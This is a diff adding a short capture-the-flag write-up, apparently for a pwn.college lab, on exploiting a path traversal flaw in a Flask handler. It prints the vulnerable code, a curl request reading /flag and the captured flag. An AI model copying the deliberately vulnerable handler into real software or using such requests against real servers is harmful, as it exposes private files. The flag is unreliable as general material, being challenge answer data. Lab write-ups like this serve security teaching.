@@ -1,0 +1,31 @@
+# Level 1
+
+we are given with a task to `Exploit a path traversal vulnerability`
+
+they provided a remote desktop which we can ssh or we can use the web interface to interact. I used the web interface to interact with the machine 🦥i'm lazy here.
+
+they also provided us with challenge source code which is in `python` 🐍 `flask`
+
+```python copy
+def level1():
+    path = request.args.get("path")
+    assert path, "Missing `path` argument"
+    return (pathlib.Path(app.root_path) / path).read_text()
+```
+This is pretty obvious that it contains a path traversal vulnerability.
+
+looking into the code we can see that it takes the `path` argument from the request and reads the file and returns the content of the file.
+```python {2,4}
+def level1():
+    path = request.args.get("path")
+    assert path, "Missing `path` argument"
+    return (pathlib.Path(app.root_path) / path).read_text()
+```
+
+so we can read any file in the system by passing the path as an argument to the request.
+
+```bash
+hacker@web-security-level-1:~$ curl http://challenge.localhost:80/?path=/flag
+pwn.college{A5rihYYnOZZceMPaZKza3U2-yjL.ddDOzMDL0IzMyMzW}
+
+```
